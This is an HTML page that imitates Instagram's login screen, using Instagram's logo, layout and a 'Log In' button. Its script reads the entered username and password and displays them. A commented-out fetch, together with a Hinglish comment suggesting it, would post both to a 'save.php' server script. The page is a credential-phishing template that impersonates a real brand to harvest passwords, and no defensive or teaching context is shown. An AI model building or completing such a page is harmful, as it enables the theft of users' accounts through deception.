<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            border: 1px solid #dbdbdb;
            background: white;
            padding: 20px 40px;
            text-align: center;
            border-radius: 1px;
            width: 350px;
        }
        .logo {
            width: 175px;
            margin: 20px auto;
        }
        input {
            width: 100%;
            padding: 9px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            background: #fafafa;
            border-radius: 3px;
        }
        button {
            width: 100%;
            padding: 7px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            margin: 10px 0;
            cursor: pointer;
        }
        .divider {
            margin: 15px 0;
            color: #8e8e8e;
            display: flex;
            align-items: center;
        }
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
            margin: 0 10px;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo" alt="Instagram">
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" onclick="showPassword()">Log In</button>
        </form>
        <div class="divider">OR</div>
        <div class="footer">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>

    <script>
        function showPassword() {
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;
            
            alert(`Username: ${username}\nPassword: ${password}`);
            
            // Agar aap chahein to password server pe bhej sakte hain (PHP required)
            // fetch('save.php', {
            //     method: 'POST',
            //     body: JSON.stringify({username, password}),
            // });
        }
    </script>
</body>
</html>
